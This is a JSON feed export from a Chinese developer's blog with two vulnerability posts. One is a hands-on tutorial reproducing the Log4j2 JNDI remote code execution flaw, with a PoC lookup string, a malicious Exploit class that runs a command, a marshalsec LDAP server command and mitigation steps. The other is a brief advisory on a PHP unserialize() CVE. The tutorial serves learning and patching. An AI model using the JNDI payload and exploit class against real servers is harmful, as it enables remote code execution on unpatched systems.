{
    "version": "https://jsonfeed.org/version/1",
    "title": "艾瑞可erik • All posts by \"漏洞\" tag • All posts by \"undefined\" categories",
    "description": "一只PHP开发的程序猿，偶尔做做运维、Goland、Python、Java、摄影、画画、写作、顺便睡觉，反正整站都搞过。",
    "home_page_url": "https://erik.xyz",
    "items": [
        {
            "id": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "url": "https://erik.xyz/2023/01/11/hand-and-hand-log4j/",
            "title": "手把手教你复现 Log4j2 漏洞",
            "date_published": "2023-01-11T14:19:00.000Z",
            "content_html": "<h4 id=\"1-简介\"><a href=\"#1-简介\" class=\"headerlink\" title=\"1.简介\"></a>1.简介</h4><p>ApacheLog4j2是一个开源的Java日志框架，被广泛地应用在中间件、开发框架与Web应用中。</p>\n<h4 id=\"2-漏洞概述\"><a href=\"#2-漏洞概述\" class=\"headerlink\" title=\"2.漏洞概述\"></a>2.漏洞概述</h4><p>该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。<br><span id=\"more\"></span></p>\n<h4 id=\"3-影响范围\"><a href=\"#3-影响范围\" class=\"headerlink\" title=\"3.影响范围\"></a>3.影响范围</h4><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p>\n<h4 id=\"4-环境搭建\"><a href=\"#4-环境搭建\" class=\"headerlink\" title=\"4.环境搭建\"></a>4.环境搭建</h4><p>1、创建一个新的maven项目，并导入Log4j的依赖包<br><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><p>1、使用POC测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.logging.log4j.LogManager;</span><br><span class=\"line\">       import org.apache.logging.log4j.Logger;</span><br><span class=\"line\">       class LogTest &#123;</span><br><span class=\"line\">           public static final Logger logger = LogManager.getLogger();</span><br><span class=\"line\">           public static void main(String[] args) &#123;</span><br><span class=\"line\">               logger.error(&quot;$&#123;jndi:ldap://localhost:8888/Exploit&#125;&quot;);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n<p>2、编译一恶意类Exploit.class</p>\n<p>首先新建exp.java，然后编译为class文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Exploit &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        System.err.println(&quot;Pwned&quot;);</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            String cmds = &quot;calc&quot;;</span><br><span class=\"line\">            Runtime.getRuntime().exec(cmds);</span><br><span class=\"line\">        &#125; catch ( Exception e ) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javac exp.java</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3、使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer</span><br><span class=\"line\">&quot;http://127.0.0.1:7777/#Exploit&quot; 8888</span><br></pre></td></tr></table></figure>\n<p><img src=\"/img/202301/20230211220751.png\" alt=\"erik.xyz\"></p>\n<p>4、运行poc.java，即可访问恶意类并执行写在其中的”calc”命令 </p>\n<p><img src=\"/img/202301/20230211221053.png\" alt=\"erik.xyz\"></p>\n<p>结合一些其它 StrLookup 适当变形，以及配合官方测试用例中脏数据”?Type=A Type&amp;Name=1100110&amp;Char=!”可绕过rc1，RC2版本对此异常进行了捕获。<br><img src=\"/img/202301/20230211221141.png\" alt=\"erik.xyz\"></p>\n<h4 id=\"5-修复方式\"><a href=\"#5-修复方式\" class=\"headerlink\" title=\"5.修复方式\"></a>5.修复方式</h4><p>目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，并及时升级至最新版本：<a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2\">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> 建议同时采用如下临时措施进行漏洞防范：</p>\n<p>1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；</p>\n<p>2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；</p>\n<p>3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；</p>\n<p>4）部署使用第三方防火墙产品进行安全防护。</p>\n<p>链接：<a href=\"https://blog.csdn.net/qq_40989258/article/details/121862363\">https://blog.csdn.net/qq_40989258/article/details/121862363</a></p>\n",
            "tags": [
                "漏洞",
                "log4j2"
            ]
        },
        {
            "id": "https://erik.xyz/2014/12/25/php-unserialize-an-quan-lou-dong/",
            "url": "https://erik.xyz/2014/12/25/php-unserialize-an-quan-lou-dong/",
            "title": "PHP “Unserialize()”安全漏洞",
            "date_published": "2014-12-25T02:27:00.000Z",
            "content_html": "<p>来源：Linux社区  作者：Linux 受影响系统： PHP PHP &lt; 5.4.36 描述： CVE(CAN) ID: CVE-2014-8142 PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。 PHP 5.4.36之前版本，”process_nested_data()”函数在实现上存在释放后重利用漏洞，攻击者通过向”unserialize()” 函数传递构造的输入，利用此漏洞可破坏内存；”var_push_dtor()”函数在实现上存在空指针间接引用漏洞，攻击者通过 向”unserialize()”函数传递构造的输入，利用此漏洞可造成崩溃。成功利用这些漏洞可造成任意代码执行。 &lt;<em>来源：Stefan Esser 链接：<a href=\"http://secunia.com/advisories/61236/\">http://secunia.com/advisories/61236/</a> </em>> 建议： 厂商补丁： PHP —- 目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载： PHP: <a href=\"http://php.net/ChangeLog-5.php#5.4.36\">http://php.net/ChangeLog-5.php#5.4.36</a> <a href=\"https://bugs.php.net/bug.php?id=68594\">https://bugs.php.net/bug.php?id=68594</a> Charlie Eriksen: <a href=\"https://bugs.php.net/bug.php?id=68545\">https://bugs.php.net/bug.php?id=68545</a> <a href=\"http://www.linuxidc.com/topicnews.aspx?tid=14\" title=\"CentOS\">CentOS</a> 6.3 安装LNMP (PHP 5.4,MyySQL5.6) <a href=\"http://www.linuxidc.com/Linux/2013-04/82069.htm\">http://www.linuxidc.com/Linux/2013-04/82069.htm</a> 在部署LNMP的时候遇到Nginx启动失败的2个问题 <a href=\"http://www.linuxidc.com/Linux/2013-03/81120.htm\">http://www.linuxidc.com/Linux/2013-03/81120.htm</a> <a href=\"http://www.linuxidc.com/topicnews.aspx?tid=2\" title=\"Ubuntu\">Ubuntu</a>安装Nginx php5-fpm MySQL(LNMP环境搭建) <a href=\"http://www.linuxidc.com/Linux/2012-10/72458.htm\">http://www.linuxidc.com/Linux/2012-10/72458.htm</a></p>\n",
            "tags": [
                "php",
                "php服务器",
                "漏洞"
            ]
        }
    ]
}